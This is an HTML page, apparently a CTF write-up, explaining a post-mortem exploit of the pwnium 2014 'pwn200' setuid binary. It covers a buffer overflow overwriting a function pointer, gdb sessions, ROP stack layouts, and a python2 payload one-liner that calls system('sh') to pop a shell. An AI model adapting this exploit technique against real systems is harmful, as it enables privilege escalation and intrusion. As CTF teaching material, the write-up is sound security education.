@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+        <title>Be a Robot</title>
+        <meta charset="utf-8" />
+        <link href="http://krebsco.de/atom.xml" type="application/atom+xml" rel="alternate" title="Krebs CTF Writeups Full Atom Feed" />
+
+
+        <!-- Mobile viewport optimized: j.mp/bplateviewport -->
+        <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1">
+
+        <link rel="stylesheet" type="text/css" href="./theme/gumby.css" />
+        <link rel="stylesheet" type="text/css" href="./theme/style.css" />
+        <link rel="stylesheet" type="text/css" href="./theme/pygment.css" />
+
+        <script src="./theme/js/libs/modernizr-2.6.2.min.js"></script>
+
+
+
+
+
+
+</head>
+
+<body id="index" class="home">
+
+
+    <div class="container">
+
+        <div class="row">
+
+          <header id="banner" class="body">
+                  <h1><a href="./">Krebs CTF Writeups <strong></strong></a></h1>
+          </header><!-- /#banner -->
+
+            <div id="navigation" class="navbar row">
+              <a href="#" gumby-trigger="#navigation &gt; ul" class="toggle"><i class="icon-menu"></i></a>
+             
+              <ul class="columns">
+                <li><a href="./">Home</a></li>
+
+                <li><a href="/writeups/atom.xml">RSS</a></li>
+                <li><a href="./pages/contact.html">Contact</a></li>
+
+              </ul>
+            </div>
+
+<section id="content" class="body">
+
+   <div class="row">
+        <div class="eleven columns">
+
+
+            <header>
+              <h2 class="entry-title">
+                <a href="./be-a-robot.html" rel="bookmark"
+                   title="Permalink to Be a Robot">Be a Robot</a></h2>
+           
+            </header>
+            <footer class="post-info">
+              <abbr class="published" title="2014-07-30T00:00:00">
+                Wed 30 July 2014
+              </abbr>
+              <address class="vcard author">By 
+                <a class="url fn" href="./author/makefu.html"> makefu</a>
+              </address>
+            </footer><!-- /.post-info -->
+            <div class="entry-content">
+              <ul>
+<li><strong>Author</strong>: makefu</li>
+</ul>
+<h2>Intro</h2>
+<p>First of all, this is a post-mortem solution for pwn200 as we failed to finish
+it within ctf time both because the challenge was offline alot of the time and
+that we were not experienced enough to find a solution.</p>
+<p>The challenge was to elevate privileges on a remote server to a user which was
+able to read the file $HOME/flag . The folder also contained a file named
+pwn200 which had suid bit set for the user -&gt; pop a shell by finding a vuln in
+this program.</p>
+<h2>Track the Vuln</h2>
+<p>Running the program looks like this:</p>
+<div class="highlight"><pre><span class="nv">$ </span>./pwn200 
+Name: Bob
+Age: 10
+Goodbye little boy
+
+<span class="nv">$ </span>./pwn200
+Name: Khan
+Age: -1
+<span class="o">[</span>1<span class="o">]</span>    6141 segmentation fault  ./pwn200
+</pre></div>
+
+
+<p>When supplying a negative age <code>eax</code> will not be updated in the function atExit
+and the pointer will stay uninitialized. </p>
+<p><img alt="failed check in atExit" src="data/be_a_robot/atExit.png" /></p>
+<p>The fgets which reads the name contains a buffer overflow which allows us to override exactly this pointer.</p>
+<p><img alt="bof in read_user" src="data/be_a_robot/read_user.png" /></p>
+<p>Trying it in gdb looks like this:</p>
+<div class="highlight"><pre><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">br</span> <span class="o">*</span><span class="mh">0x8048670</span> <span class="err">#</span> <span class="nx">call</span> <span class="nx">eax</span>
+<span class="nx">Breakpoint</span> <span class="mi">1</span> <span class="nx">at</span> <span class="mh">0x8048670</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">r</span>
+<span class="nx">Starting</span> <span class="nx">program</span><span class="o">:</span> <span class="err">/home/makefu/pwnium/200/pwn200 </span>
+<span class="nx">warning</span><span class="o">:</span> <span class="nx">Could</span> <span class="nx">not</span> <span class="nx">load</span> <span class="nx">shared</span> <span class="nx">library</span> <span class="nx">symbols</span> <span class="k">for</span> <span class="nx">linux</span><span class="o">-</span><span class="nx">gate</span><span class="p">.</span><span class="nx">so</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span>
+<span class="nx">Do</span> <span class="nx">you</span> <span class="nx">need</span> <span class="s2">&quot;set solib-search-path&quot;</span> <span class="nx">or</span> <span class="s2">&quot;set sysroot&quot;</span><span class="o">?</span>
+<span class="nx">Name</span><span class="o">:</span> <span class="nx">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+
+<span class="nx">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08048670</span> <span class="k">in</span> <span class="nx">atExit</span> <span class="p">()</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">disass</span> 
+<span class="nx">Dump</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">code</span> <span class="k">for</span> <span class="kd">function</span> <span class="nx">atExit</span><span class="o">:</span>
+  <span class="mh">0x08048660</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>  <span class="nx">cmp</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="cp">]</span><span class="p">,</span><span class="mh">0x0</span>
+  <span class="mh">0x08048664</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>  <span class="nx">jle</span>    <span class="mh">0x804866d</span> <span class="o">&lt;</span><span class="nx">atExit</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;</span>
+  <span class="mh">0x08048666</span> <span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="cp">]</span><span class="p">,</span><span class="mh">0x804860c</span>
+  <span class="mh">0x0804866d</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span>  <span class="nx">mov</span>    <span class="nx">eax</span><span class="p">,</span><span class="nx">DWORD</span> <span class="nx">PTR</span> <span class="cp">[</span><span class="nx">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="cp">]</span>
+<span class="o">=&gt;</span> <span class="mh">0x08048670</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;:</span>  <span class="nx">call</span>   <span class="nx">eax</span>
+  <span class="mh">0x08048672</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;:</span>  <span class="nx">leave</span>  
+  <span class="mh">0x08048673</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;:</span>  <span class="nx">ret</span>    
+<span class="nx">End</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">dump</span><span class="p">.</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">i</span> <span class="nx">r</span> <span class="nx">eax</span>
+<span class="nx">eax</span>            <span class="mh">0x41414141</span> <span class="mi">1094795585</span>
+</pre></div>
+
+
+<h2>Prepare the stack for ROP</h2>
+<p>We cannot directly execute our name string as both ASLR and NX-Stack are enabled but there is a system call in a unused function called <code>test</code>:</p>
+<div class="highlight"><pre><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">disassemble</span> <span class="nx">test</span>
+<span class="nx">Dump</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">code</span> <span class="k">for</span> <span class="kd">function</span> <span class="nx">test</span><span class="o">:</span>
+  <span class="mh">0x08048694</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span> <span class="nx">push</span>   <span class="nx">ebp</span>
+  <span class="mh">0x08048695</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span> <span class="nx">mov</span>    <span class="nx">ebp</span><span class="p">,</span><span class="nx">esp</span>
+  <span class="mh">0x08048697</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span> <span class="nx">sub</span>    <span class="nx">esp</span><span class="p">,</span><span class="mh">0x8</span>
+  <span class="mh">0x0804869a</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span> <span class="nx">sub</span>    <span class="nx">esp</span><span class="p">,</span><span class="mh">0xc</span>
+  <span class="mh">0x0804869d</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span> <span class="nx">push</span>   <span class="mh">0x80487f3</span>
+  <span class="mh">0x080486a2</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>  <span class="nx">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="nx">system</span><span class="err">@</span><span class="nx">plt</span><span class="o">&gt;</span>
+  <span class="mh">0x080486a7</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>  <span class="nx">add</span>    <span class="nx">esp</span><span class="p">,</span><span class="mh">0x10</span>
+  <span class="mh">0x080486aa</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;:</span>  <span class="nx">leave</span>  
+  <span class="mh">0x080486ab</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>  <span class="nx">ret</span>    
+<span class="nx">End</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">dump</span><span class="p">.</span>
+</pre></div>
+
+
+<p>Too bad we cannot directly prepare the stack with our provided text to supply a string which then can be executed. 
+To be clear: we currently only control eip, not the whole stack. ROP to the rescue!</p>
+<p>This is how our stack must look like for a successful exploit:</p>
+<table>
+<thead>
+<tr>
+<th>Address</th>
+<th align="right">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>call system</td>
+<td align="right">&lt;- esp</td>
+</tr>
+<tr>
+<td>[command-string]</td>
+<td align="right">&lt;- esp + 4 (first argument)</td>
+</tr>
+</tbody>
+</table>
+<p>The ROP gadget i used is a simple 'pop-ret' which can be found with for example <a href="http://shell-storm.org/project/ROPgadget/">msfrop</a> or <a href="http://shell-storm.org/project/ROPgadget/">ROPgadget</a>. POP-RET is at <code>0x080487a6</code>.</p>
+<p>By that we can prepare our input as an argument for the system call. As we have no shell command yet we will used <code>0x80487f3</code> - 'echo pwned' for testing.</p>
+<h3>Follow the Execution Flow</h3>
+<p>These tables show the stack after each ROP step.</p>
+<p><strong>Before call ROP</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">Address</th>
+<th align="center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">[A*36]</td>
+<td align="center">BOF Filler</td>
+</tr>
+<tr>
+<td align="left">[AAAA]</td>
+<td align="center">BOF Filler</td>
+</tr>
+<tr>
+<td align="left">0x080486a2 <code>esp</code></td>
+<td align="center">call system</td>
+</tr>
+<tr>
+<td align="left">0x080487f3</td>
+<td align="center">"echo hacked"</td>
+</tr>
+<tr>
+<td align="left">[BBBB]</td>
+<td align="center">Filler</td>
+</tr>
+<tr>
+<td align="left">0x080487a6 <code>eip</code></td>
+<td align="center">pop ebx;ret</td>
+</tr>
+</tbody>
+</table>
+<p><strong>After ret from pop-ret ROP Gadget</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">Address</th>
+<th align="center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">[A*32]</td>
+<td align="center">BOF Filler</td>
+</tr>
+<tr>
+<td align="left">0x08048672</td>
+<td align="center">ret addr call-eax</td>
+</tr>
+<tr>
+<td align="left">0x080486a2</td>
+<td align="center">call system</td>
+</tr>
+<tr>
+<td align="left">0x080487f3 <code>esp</code></td>
+<td align="center">"echo hacked"</td>
+</tr>
+<tr>
+<td align="left">[BBBB]</td>
+<td align="center">Filler</td>
+</tr>
+<tr>
+<td align="left">0x080487a6</td>
+<td align="center">pop ebx;ret</td>
+</tr>
+</tbody>
+</table>
+<p><strong>After call system</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">Address</th>
+<th align="center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">[A*32]</td>
+<td align="center">BOF Filler</td>
+</tr>
+<tr>
+<td align="left">0x08048672</td>
+<td align="center">ret addr call-eax</td>
+</tr>
+<tr>
+<td align="left">0x080486a2 <code>esp</code></td>
+<td align="center">ret addr call-system</td>
+</tr>
+<tr>
+<td align="left">0x080487f3 <code>parm1</code></td>
+<td align="center">"echo hacked"</td>
+</tr>
+<tr>
+<td align="left">[BBBB]</td>
+<td align="center">Filler</td>
+</tr>
+<tr>
+<td align="left">0x080487a6</td>
+<td align="center">pop ebx;ret</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Quick Sidenote:</strong></p>
+<ol>
+<li><code>call address</code> pushes the return address($eip+sizeof(call)) onto the stack and executes the function at  <strong>address</strong>.</li>
+<li><em>ret</em> pops the return address from the stack and executes the address</li>
+</ol>
+<p>The payload generation and testing looks like this:</p>
+<div class="highlight"><pre>python2 -c <span class="s1">&#39;print(&quot;A&quot;*36+&quot;\xa2\x86\x04\x08&quot;+&quot;\x01\x8c\x04\x08&quot;+&quot;BBBB&quot;+ &quot;\xa6\x87\x04\x08&quot;+&quot;CCCC&quot;+&quot;DDDD&quot;+ &quot;EEE\n&quot; +&quot;-1&quot;)&#39;</span>  &gt; in
+gdb ./pwn200
+<span class="o">(</span>gdb<span class="o">)</span> r &lt; in
+Starting program: ./pwn200 &lt; in
+hacked
+Name: Age: <span class="o">[</span>Inferior 1 <span class="o">(</span>process 11968<span class="o">)</span> exited normally<span class="o">]</span>
+</pre></div>
+
+
+<h3>Find the exec string</h3>
+<p>We need a string address for system argument which allows us to run whatever commands we want. Due to the fact aslr is enabled hitting our 36 bytes short buffer is kind of unlikely. Using environment variables with <code>" "\*9001 +"/bin/sh"</code> may give us a better chance to guess the address but is still pretty crude.</p>
+<p><code>"sh"</code> which is short and gives us full access may reside in the executable after being loaded in the memory so i gave it a shot with gdb:</p>
+<div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="n">main</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048701A</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">start</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">proc</span> <span class="n">mappings</span>
+<span class="n">process</span> <span class="mi">11324</span>
+<span class="n">Mapped</span> <span class="n">address</span> <span class="n">spaces</span><span class="o">:</span>
+
+  <span class="n">Start</span> <span class="n">Addr</span>   <span class="n">End</span> <span class="n">Addr</span>       <span class="n">Size</span>     <span class="n">Offset</span> <span class="n">objfile</span>
+  <span class="mh">0x8048000</span>  <span class="mh">0x8049000</span>     <span class="mh">0x1000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">makefu</span><span class="o">/</span><span class="n">pwnium</span><span class="o">/</span><span class="mi">200</span><span class="o">/</span><span class="n">pwn200</span>
+  <span class="mh">0x8049000</span>  <span class="mh">0x804a000</span>     <span class="mh">0x1000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">makefu</span><span class="o">/</span><span class="n">pwnium</span><span class="o">/</span><span class="mi">200</span><span class="o">/</span><span class="n">pwn200</span>
+  <span class="mh">0xf7564000</span> <span class="mh">0xf7565000</span>     <span class="mh">0x1000</span>        <span class="mh">0x0</span> 
+  <span class="mh">0xf7565000</span> <span class="mh">0xf7720000</span>   <span class="mh">0x1bb000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib32</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.19</span><span class="p">.</span><span class="n">so</span>
+  <span class="mh">0xf7720000</span> <span class="mh">0xf7723000</span>     <span class="mh">0x3000</span>   <span class="mh">0x1ba000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib32</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.19</span><span class="p">.</span><span class="n">so</span>
+  <span class="mh">0xf7723000</span> <span class="mh">0xf7725000</span>     <span class="mh">0x2000</span>   <span class="mh">0x1bd000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib32</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.19</span><span class="p">.</span><span class="n">so</span>
+  <span class="mh">0xf7725000</span> <span class="mh">0xf7727000</span>     <span class="mh">0x2000</span>        <span class="mh">0x0</span> 
+  <span class="mh">0xf7757000</span> <span class="mh">0xf7759000</span>     <span class="mh">0x2000</span>        <span class="mh">0x0</span> 
+  <span class="mh">0xf7759000</span> <span class="mh">0xf775a000</span>     <span class="mh">0x1000</span>        <span class="mh">0x0</span> <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
+  <span class="mh">0xf775a000</span> <span class="mh">0xf777b000</span>    <span class="mh">0x21000</span>        <span class="mh">0x0</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib32</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.19</span><span class="p">.</span><span class="n">so</span>
+  <span class="mh">0xf777b000</span> <span class="mh">0xf777c000</span>     <span class="mh">0x1000</span>        <span class="mh">0x0</span> 
+  <span class="mh">0xf777c000</span> <span class="mh">0xf777d000</span>     <span class="mh">0x1000</span>    <span class="mh">0x21000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib32</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.19</span><span class="p">.</span><span class="n">so</span>
+  <span class="mh">0xf777d000</span> <span class="mh">0xf777e000</span>     <span class="mh">0x1000</span>    <span class="mh">0x22000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib32</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.19</span><span class="p">.</span><span class="n">so</span>
+  <span class="mh">0xffeba000</span> <span class="mh">0xffedb000</span>    <span class="mh">0x21000</span>        <span class="mh">0x0</span> <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">find</span> <span class="mh">0x08048000</span><span class="p">,</span> <span class="o">+</span><span class="mi">5000</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span>
+<span class="mh">0x8048c01</span>
+<span class="mi">1</span> <span class="n">pattern</span> <span class="n">found</span><span class="p">.</span>
+</pre></div>
+
+
+<p>Instead of 0x80487f3 we are now using 0x8048c01.</p>
+<h2>Putting it all together</h2>
+<div class="highlight"><pre><span class="c"># first pipe the shellcode, then use stdin</span>
+<span class="o">(</span>python2 -c <span class="s1">&#39;print(&quot;A&quot;*36+&quot;\xa2\x86\x04\x08&quot;+&quot;\x01\x8c\x04\x08&quot;+&quot;BBBB&quot;+ &quot;\xa6\x87\x04\x08&quot;+&quot;CCCC&quot;+&quot;DDDD&quot;+ &quot;EEE\n&quot; +&quot;-1&quot;)&#39;</span>; cat<span class="o">)</span> | ./pwn200
+ls /
+bin   dev  krebs  media  root  sbin  sys  usr  var
+boot  etc  home   lib    mnt   proc  run  tmp
+</pre></div>
+
+
+<h2>Cheers</h2>
+<p>To <a href="https://ctftime.org/team/6997">Team Action Kaktus</a> on ctftime for making a writeup with a nonfunct solution, this made me try hard enough to finish it by myself.</p>
+            </div><!-- /.entry-content -->
+
+
+        </div><!-- /.eleven.columns -->
+        
+<div class="three columns">
+
+<h4>Pages</h4>
+
+ <ul>
+      <li><a href="/writeups/atom.xml">RSS</a></li>
+      <li><a href="./pages/contact.html">Contact</a></li>
+  </ul>
+
+<!--<h4>Categories</h4>
+<ul>
+		<li><a href="./category/posts.html">posts</a></li>
+</ul>
+-->
+
+<h4>Tags</h4>
+	<ul>
+	    <li class="tag-1"><a href="./tag/crackme.html">crackme</a></li>
+	    <li class="tag-4"><a href="./tag/post-mortem.html">post-mortem</a></li>
+	    <li class="tag-1"><a href="./tag/pwnium2014.html">pwnium2014</a></li>
+	    <li class="tag-2"><a href="./tag/captcha.html">captcha</a></li>
+</ul>
+
+
+<nav class="widget">
+  <h4>Social</h4>
+  <ul>
+    <li><a href="http://twitter.com/krebsbob">@krebsbob</a></li>
+    <li><a href="irc://irc.freenode.net#krebs">irc.freenode.net#krebs</a></li>
+  </ul>
+</nav>
+
+</div> </div><!-- /.row -->
+
+
+</section>
+
+       </div><!-- /.row -->
+    </div><!-- /.container -->
+
+
+       <div class="container.nopad bg">
+
+    
+        <footer id="credits" class="row">
+          <div class="seven columns left-center">
+
+                   <address id="about" class="vcard body">
+                    Proudly powered by <a href="http://getpelican.com/">Pelican</a>,
+                    which takes great advantage of <a href="http://python.org">Python</a>.
+                    <br />
+                    Based on the <a target="_blank" href="http://gumbyframework.com">Gumby Framework</a>
+                    </address>
+          </div>
+
+
+          <div class="seven columns">
+            <div class="row">
+              <ul class="socbtns">
+
+
+
+
+
+              </ul>
+            </div>
+          </div>
+        </footer>
+
+    </div>
+
+
+  <script src="./theme/js/libs/jquery-1.9.1.min.js"></script>
+  <script src="./theme/js/libs/gumby.min.js"></script>
+  <script src="./theme/js/plugins.js"></script>
+</body>
+</html>
